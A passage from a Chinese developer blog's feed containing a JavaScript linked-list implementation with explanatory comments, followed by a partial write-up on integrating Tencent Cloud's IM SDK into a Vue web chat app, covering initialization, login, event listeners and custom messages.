class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// 封装链表类</span></span><br><span class="line">    function LinkList()&#123;</span><br><span class="line">      <span class="comment">// 封装一个内部类：节点类</span></span><br><span class="line">      function Node(<span class="keyword">data</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="keyword">data</span> = <span class="keyword">data</span>;</span><br><span class="line">        <span class="keyword">this</span>.next = <span class="literal">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 属性</span></span><br><span class="line">      <span class="comment">// 属性head指向链表的第一个节点</span></span><br><span class="line">      <span class="keyword">this</span>.head = <span class="literal">null</span>;</span><br><span class="line">      <span class="keyword">this</span>.length = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 一.实现append方法</span></span><br><span class="line">      LinkList.prototype.append = <span class="keyword">data</span> =&gt; &#123;</span><br><span class="line">        <span class="comment">//1.创建新节点</span></span><br><span class="line">        let newNode = new Node(<span class="keyword">data</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.添加新节点</span></span><br><span class="line">        <span class="comment">//情况1：只有一个节点时候</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.length == <span class="number">0</span>)&#123;</span><br><span class="line">          <span class="keyword">this</span>.head = newNode</span><br><span class="line">        <span class="comment">//情况2：节点数大于1，在链表的最后添加新节点  </span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;              </span><br><span class="line">          <span class="comment">//让变量current指向第一个节点</span></span><br><span class="line">          let current = <span class="keyword">this</span>.head</span><br><span class="line">          <span class="comment">//当current.next(下一个节点不为空)不为空时，一直循环，直到current指向最后一个节点</span></span><br><span class="line">          <span class="keyword">while</span> (current.next)&#123;</span><br><span class="line">            current = current.next</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// 最后节点的next指向新的节点</span></span><br><span class="line">          current.next = newNode</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//3.添加完新结点之后length+1</span></span><br><span class="line">        <span class="keyword">this</span>.length += <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 二.实现toString方法</span></span><br><span class="line">      LinkList.prototype.toString = () =&gt; &#123;</span><br><span class="line">        <span class="comment">// 1.定义变量</span></span><br><span class="line">        let current = <span class="keyword">this</span>.head</span><br><span class="line">        let listString = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.循环获取一个个的节点</span></span><br><span class="line">        <span class="keyword">while</span>(current)&#123; </span><br><span class="line">          listString += current.<span class="keyword">data</span> + <span class="string">&quot; &quot;</span></span><br><span class="line">          current = current.next<span class="comment">//千万不要忘了拼接完一个节点数据之后，让current指向下一个节点</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  listString</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 三.实现insert方法</span></span><br><span class="line">      LinkList.prototype.insert = (position, <span class="keyword">data</span>) =&gt; &#123;</span><br><span class="line">      <span class="comment">//理解positon的含义：position=0表示新界点插入后要成为第1个节点，position=2表示新界点插入后要成为第3个节点</span></span><br><span class="line">        <span class="comment">//1.对position进行越界判断:要求传入的position不能是负数且不能超过LinkList的length</span></span><br><span class="line">        <span class="keyword">if</span>(position &lt; <span class="number">0</span> || position &gt; <span class="keyword">this</span>.length)&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//2.根据data创建newNode</span></span><br><span class="line">        let newNode = new Node(<span class="keyword">data</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.插入新节点</span></span><br><span class="line">        <span class="comment">//情况1：插入位置position=0</span></span><br><span class="line">        <span class="keyword">if</span>(position == <span class="number">0</span>)&#123;</span><br><span class="line">          <span class="comment">// 让新节点指向第一个节点</span></span><br><span class="line">          newNode.next = <span class="keyword">this</span>.head</span><br><span class="line">          <span class="comment">// 让head指向新节点</span></span><br><span class="line">          <span class="keyword">this</span>.head = newNode</span><br><span class="line">        <span class="comment">//情况2：插入位置position&gt;0(该情况包含position=length)</span></span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">          let index = <span class="number">0</span></span><br><span class="line">          let previous = <span class="literal">null</span></span><br><span class="line">          let current = <span class="keyword">this</span>.head</span><br><span class="line">          <span class="comment">//步骤1：通过while循环使变量current指向position位置的后一个节点(注意while循环的写法)</span></span><br><span class="line">          <span class="keyword">while</span>(index++ &lt; position)&#123;</span><br><span class="line">          <span class="comment">//步骤2：在current指向下一个节点之前，让previous指向current当前指向的节点</span></span><br><span class="line">            previous = current</span><br><span class="line">            current = current.next</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// 步骤3：通过变量current(此时current已经指向position位置的后一个节点)，使newNode指向position位置的后一个节点</span></span><br><span class="line">          newNode.next = current</span><br><span class="line">          <span class="comment">//步骤4：通过变量previous，使position位置的前一个节点指向newNode</span></span><br><span class="line">          previous.next = newNode</span><br><span class="line">          </span><br><span class="line"><span class="comment">//我们无法直接操作链表中的节点，但是可以通过变量指向这些节点，以此间接地操作节点；</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//4.新节点插入后要length+1</span></span><br><span class="line">        <span class="keyword">this</span>.length += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//四.实现get方法</span></span><br><span class="line">      LinkList.prototype.<span class="keyword">get</span> = (position) =&gt; &#123;</span><br><span class="line">        <span class="comment">//1.越界判断</span></span><br><span class="line">        <span class="comment">// 当position = length时，取到的是null所以0 =&lt; position &lt; length</span></span><br><span class="line">        <span class="keyword">if</span>(position &lt; <span class="number">0</span> || position &gt;= <span class="keyword">this</span>.length)&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//2.获取指定的positon位置的后一个节点的data</span></span><br><span class="line">        <span class="comment">//同样使用一个变量间接操作节点</span></span><br><span class="line">        let current = <span class="keyword">this</span>.head</span><br><span class="line">        let index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span>(index++ &lt; position)&#123;</span><br><span class="line">          current = current.next</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> current.<span class="keyword">data</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//五.实现indexOf方法</span></span><br><span class="line">      LinkList.prototype.indexOf = <span class="keyword">data</span> =&gt; &#123;</span><br><span class="line">        <span class="comment">//1.定义变量</span></span><br><span class="line">        let current = <span class="keyword">this</span>.head</span><br><span class="line">        let index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.开始查找:只要current不指向null就一直循环</span></span><br><span class="line">        <span class="keyword">while</span>(current)&#123;</span><br><span class="line">          <span class="keyword">if</span>(current.<span class="keyword">data</span> == <span class="keyword">data</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> index</span><br><span class="line">          &#125;</span><br><span class="line">          current = current.next</span><br><span class="line">          index += <span class="number">1</span></span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.遍历完链表没有找到，返回-1</span></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//六.实现update方法</span></span><br><span class="line">      LinkList.prototype.update = (position, newData) =&gt; &#123;</span><br><span class="line">        <span class="comment">//1.越界判断</span></span><br><span class="line">        <span class="comment">//因为被修改的节点不能为null，所以position不能等于length</span></span><br><span class="line">        <span class="keyword">if</span>(position &lt; <span class="number">0</span> || position &gt;= <span class="keyword">this</span>.length)&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//2.查找正确的节点</span></span><br><span class="line">        let current = <span class="keyword">this</span>.head</span><br><span class="line">        let index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span>(index++ &lt; position)&#123;</span><br><span class="line">          current = current.next</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//3.将position位置的后一个节点的data修改成newData</span></span><br><span class="line">        current.<span class="keyword">data</span> = newData</span><br><span class="line">        <span class="comment">//返回true表示修改成功</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//七.实现removeAt方法</span></span><br><span class="line">      LinkList.prototype.removeAt = position =&gt; &#123;</span><br><span class="line">        <span class="comment">//1.越界判断</span></span><br><span class="line">        <span class="keyword">if</span> (position &lt; <span class="number">0</span> || position &gt;= <span class="keyword">this</span>.length) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//2.删除元素</span></span><br><span class="line">        <span class="comment">//情况1：position = 0时(删除第一个节点)</span></span><br><span class="line">        let current = <span class="keyword">this</span>.head</span><br><span class="line">        <span class="keyword">if</span> (position ==<span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">//情况2：position &gt; 0时</span></span><br><span class="line">          <span class="keyword">this</span>.head = <span class="keyword">this</span>.head.next</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          let index = <span class="number">0</span></span><br><span class="line">          let previous = <span class="literal">null</span></span><br><span class="line">          <span class="keyword">while</span> (index++ &lt; position) &#123;</span><br><span class="line">            previous = current</span><br><span class="line">            current = current.next</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">//循环结束后，current指向position后一个节点，previous指向current前一个节点</span></span><br><span class="line">          <span class="comment">//再使前一个节点的next指向current的next即可</span></span><br><span class="line">          previous.next = current.next</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//3，length-1</span></span><br><span class="line">        <span class="keyword">this</span>.length -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//返回被删除节点的data，为此current定义在最上面</span></span><br><span class="line">        <span class="keyword">return</span> current.<span class="keyword">data</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*-------------其他方法的实现--------------*/</span></span><br><span class="line">      <span class="comment">//八.实现remove方法</span></span><br><span class="line">      LinkList.prototype.remove = (<span class="keyword">data</span>) =&gt; &#123;</span><br><span class="line">        <span class="comment">//1.获取data在列表中的位置</span></span><br><span class="line">        let position = <span class="keyword">this</span>.indexOf(<span class="keyword">data</span>)</span><br><span class="line">        <span class="comment">//2.根据位置信息，删除结点</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.removeAt(position)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//九.实现isEmpty方法</span></span><br><span class="line">      LinkList.prototype.isEmpty = () =&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.length == <span class="number">0</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//十.实现size方法</span></span><br><span class="line">      LinkList.prototype.size = () =&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.length</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>参考资料:<a href="https://www.bilibili.com/video/BV1x7411L7Q7?from=search&seid=3912456004602554239">JavaScript数据结构与算法</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="http://aiolimp.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="数据结构" scheme="http://aiolimp.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>IM聊天</title>
    <link href="http://aiolimp.com/2021/08/21/IM%E8%81%8A%E5%A4%A9/"/>
    <id>http://aiolimp.com/2021/08/21/IM%E8%81%8A%E5%A4%A9/</id>
    <published>2021-08-21T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.206Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="IM聊天"><a href="#IM聊天" class="headerlink" title="IM聊天"></a>IM聊天</h2><p>耗时三个月终于在公司完成了一个聊天系统的需求，过程很麻烦，但是经过自己的不断探索还是成功开发出来并且完美上线。这算是自己接触的一个比较完整的利用前端API进行的开发，所以在这里也做一个总结。</p><p>IM聊天主要利用的是腾讯云的<a href="https://cloud.tencent.com/document/product/269">即时通讯</a>进行消息功能实现。里面的<code>SDK</code>文档相当详细，也有不错的demo供开发者学习，能实现消息的发送、接收功能其实并不难和后端做好数据上的处理基本都可以实现，主要是公司的聊天系统需求比较复杂，一直在进行不断的迭代更新，包括后期实现的智能客服聊天系统、聊天远程控制功能等等。总体来说还是比较复杂，这里主要针对开发进行一个大致的总结，详细的可以在我的github看看<a href="https://github.com/Aiolimp/IM-VisitorMessage">源代码</a>以作参考。</p><p>项目主要针对web端实现IM聊天，可以看看<a href="https://cloud.tencent.com/document/product/269/37411">官方文档</a>提供的教程。</p><p><strong>聊天界面：</strong></p><p>客服端：</p><p><img src="https://img-blog.csdnimg.cn/55af7f5e2f03458caf85583696eeffe6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fpb2xpbXA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>访客端：</p><h3 id="初始化TIM"><a href="#初始化TIM" class="headerlink" title="初始化TIM"></a><strong>初始化TIM</strong></h3><p>接入前，您需要在 <a href="https://console.cloud.tencent.com/avc">云通信控制台</a> 中创建一个云通信应用，并取得 <code>SDKAppID</code>。</p><table><thead><tr><th align="left">API</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn//TIM.html#.create">create</a></td><td align="left">创建 SDK 实例。</td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//src/utils/tim.js</span></span><br><span class="line"><span class="keyword">import</span> TIM <span class="keyword">from</span> <span class="string">&#x27;tim-js-sdk&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> COS <span class="keyword">from</span> <span class="string">&quot;cos-js-sdk-v5&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tim</span> (<span class="params">SDKAppID</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> options = &#123;</span><br><span class="line">    SDKAppID: SDKAppID <span class="comment">// 接入时需要将0替换为您的即时通信 IM 应用的 SDKAppID</span></span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// 创建 SDK 实例，`TIM.create()`方法对于同一个 `SDKAppID` 只会返回同一份实例</span></span><br><span class="line">  <span class="keyword">let</span> tim = TIM.create(options); <span class="comment">// SDK 实例通常用 tim 表示</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 设置 SDK 日志输出级别，详细分级请参见 setLogLevel 接口的说明</span></span><br><span class="line">  tim.setLogLevel(<span class="number">1</span>); <span class="comment">// 普通级别，日志量较多，接入时建议使用</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 注册 COS SDK 插件</span></span><br><span class="line">  tim.registerPlugin(&#123;<span class="string">&#x27;cos-js-sdk&#x27;</span>: COS&#125;);</span><br><span class="line">  <span class="keyword">return</span> tim</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> tim</span><br></pre></td></tr></table></figure><p><strong>在main.js中全局挂载：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">&quot;./App.vue&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&quot;./store/index&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  router</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&quot;./routes/routes&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> Antd <span class="keyword">from</span> <span class="string">&quot;ant-design-vue&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;./api/index&#x27;</span></span><br><span class="line"><span class="keyword">import</span> tim <span class="keyword">from</span> <span class="string">&#x27;./utils/tim&#x27;</span></span><br><span class="line"><span class="keyword">import</span> TIM <span class="keyword">from</span> <span class="string">&#x27;tim-js-sdk&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.prototype.tim = tim</span><br><span class="line">Vue.prototype.TIM = TIM</span><br><span class="line">Vue.prototype.$bus = <span class="keyword">new</span> Vue() <span class="comment">// event Bus 用于无关系组件间的通信。</span></span><br><span class="line">Vue.use(Antd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  router,</span><br><span class="line">  store,</span><br><span class="line">  render: <span class="function"><span class="params">h</span> =&gt;</span> h(App)</span><br><span class="line">&#125;).$mount(<span class="string">&quot;#app&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="登录相关"><a href="#登录相关" class="headerlink" title="登录相关"></a>登录相关</h3><p>1.首先初始化签名</p><p>使用 用户ID(userID) 和 签名串(userSig) 登录即时通信 IM，登录流程有若干个异步执行的步骤，使用返回的 Promise 对象处理登录成功或失败。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">login</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">     <span class="keyword">let</span> promise = tim.login(&#123;</span><br><span class="line">       userID: <span class="string">&quot;your userID&quot;</span>,</span><br><span class="line">       userSig: <span class="string">&quot;your userSig&quot;</span>,</span><br><span class="line">     &#125;);</span><br><span class="line">     promise</span><br><span class="line">       .then(<span class="function"><span class="keyword">function</span> (<span class="params">imResponse</span>) </span>&#123;</span><br><span class="line">         <span class="built_in">console</span>.log(imResponse.data); <span class="comment">// 登录成功</span></span><br><span class="line">         <span class="keyword">if</span> (imResponse.data.repeatLogin === <span class="literal">true</span>) &#123;</span><br><span class="line">           /</span><br><span class="line">           <span class="built_in">console</span>.log(imResponse.data.errorInfo);</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;)</span><br><span class="line">       .catch(<span class="function"><span class="keyword">function</span> (<span class="params">imError</span>) </span>&#123;</span><br><span class="line">         <span class="built_in">console</span>.warn(<span class="string">&quot;login error:&quot;</span>, imError); <span class="comment">// 登录失败的相关信息</span></span><br><span class="line">       &#125;);</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure><p>2.登录成功后会触发 SDK_READY 事件，该事件触发后，可正常使用 SDK 接口</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">initListener</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 登录成功后会触发 SDK_READY 事件，该事件触发后，可正常使用 SDK 接口</span></span><br><span class="line">    <span class="built_in">this</span>.tim(<span class="built_in">this</span>.infoObj.sdkAppID).on(</span><br><span class="line">      <span class="built_in">this</span>.TIM.EVENT.SDK_READY,</span><br><span class="line">      <span class="built_in">this</span>.onReadyStateUpdate,</span><br><span class="line">      <span class="built_in">this</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// SDK NOT READT</span></span><br><span class="line">    <span class="built_in">this</span>.tim(<span class="built_in">this</span>.infoObj.sdkAppID).on(</span><br><span class="line">      <span class="built_in">this</span>.TIM.EVENT.SDK_NOT_READY,</span><br><span class="line">      <span class="built_in">this</span>.onReadyStateUpdate,</span><br><span class="line">      <span class="built_in">this</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 被踢出</span></span><br><span class="line">    <span class="built_in">this</span>.tim(<span class="built_in">this</span>.infoObj.sdkAppID).on(</span><br><span class="line">      <span class="built_in">this</span>.TIM.EVENT.KICKED_OUT,</span><br><span class="line">      <span class="built_in">this</span>.onKickOut</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// SDK内部出错</span></span><br><span class="line">    <span class="built_in">this</span>.tim(<span class="built_in">this</span>.infoObj.sdkAppID).on(<span class="built_in">this</span>.TIM.EVENT.ERROR, <span class="built_in">this</span>.onError);</span><br><span class="line">    <span class="comment">// 收到新消息</span></span><br><span class="line">    <span class="built_in">this</span>.tim(<span class="built_in">this</span>.infoObj.sdkAppID).on(</span><br><span class="line">      <span class="built_in">this</span>.TIM.EVENT.MESSAGE_RECEIVED,</span><br><span class="line">      <span class="built_in">this</span>.onReceiveMessage</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 会话列表更新</span></span><br><span class="line">    <span class="built_in">this</span>.tim(<span class="built_in">this</span>.infoObj.sdkAppID).on(</span><br><span class="line">      <span class="built_in">this</span>.TIM.EVENT.CONVERSATION_LIST_UPDATED,</span><br><span class="line">      <span class="built_in">this</span>.onUpdateConversationList,</span><br><span class="line">      <span class="built_in">this</span></span><br><span class="line">    );</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>3.登出</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">logout</span>(<span class="params">context</span>)</span> &#123;</span><br><span class="line">  <span class="comment">// 若有当前会话，在退出登录时已读上报</span></span><br><span class="line">  <span class="keyword">if</span> (context.rootState.conversation.currentConversation.conversationID) &#123;</span><br><span class="line">    tim(store.state.basic.imInfo.sdkAppID).setMessageRead(&#123; <span class="attr">conversationID</span>:               context.rootState.conversation.currentConversation.conversationID &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  tim(store.state.basic.imInfo.sdkAppID).logout().then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    context.commit(<span class="string">&#x27;toggleIsLogin&#x27;</span>)</span><br><span class="line">    context.commit(<span class="string">&#x27;stopComputeCurrent&#x27;</span>)</span><br><span class="line">    context.commit(<span class="string">&#x27;reset&#x27;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="消息类型"><a href="#消息类型" class="headerlink" title="消息类型"></a>消息类型</h3><p>消息类型主要分为自定义消息和普通消息。</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20210818161849499.png" alt="image-20210818161849499"></p><h4 id="自定义消息："><a href="#自定义消息：" class="headerlink" title="自定义消息："></a><strong>自定义消息：</strong></h4><p>创建自定义消息实例的接口，此接口返回一个消息实例，当 SDK 提供的能力不能满足您的需求时，可以使用自定义消息进行个性化定制。</p><p>自定义消息需要和后端沟通定义子消息类型。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//访客端发送自定义消息</span></span><br><span class="line">   <span class="function"><span class="title">sendCustomMessage</span>(<span class="params">data</span>)</span> &#123;</span><br><span class="line">     <span class="keyword">let</span> data1 = <span class="built_in">JSON</span>.stringify(data);</span><br><span class="line">     <span class="keyword">if</span> (<span class="built_in">this</span>.sessionObj.serviceImAccount&amp;&amp;data1) &#123;</span><br><span class="line">       <span class="keyword">let</span> message = <span class="built_in">this</span>.tim(<span class="built_in">this</span>.imInfo.sdkAppID).createCustomMessage(&#123;</span><br><span class="line">         to: <span class="built_in">this</span>.sessionObj.serviceImAccount,</span><br><span class="line">         conversationType: <span class="built_in">this</span>.currentConversationType</span><br><span class="line">           ? <span class="built_in">this</span>.currentConversationType</span><br><span class="line">           : <span class="string">&quot;C2C&quot;</span>,</span><br><span class="line">         payload: &#123;</span><br><span class="line">           data: data1,</span><br><span class="line">           description: <span class="string">&quot;&quot;</span>,</span><br><span class="line">           extension: <span class="string">&quot;&quot;</span>,</span><br><span class="line">         &#125;,</span><br><span class="line">       &#125;);</span><br><span class="line">       <span class="built_in">this</span>.tim(<span class="built_in">this</span>.imInfo.sdkAppID)</span><br><span class="line">         .sendMessage(message)</span><br><span class="line">         .then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">           <span class="built_in">this</span>.$store.commit(<span class="string">&quot;pushCurrentMessageList&quot;</span>, message);</span><br><span class="line">         &#125;)</span><br><span class="line">         .catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">         &#125;);</span><br><span class="line">     &#125;</span><br><span class="line">   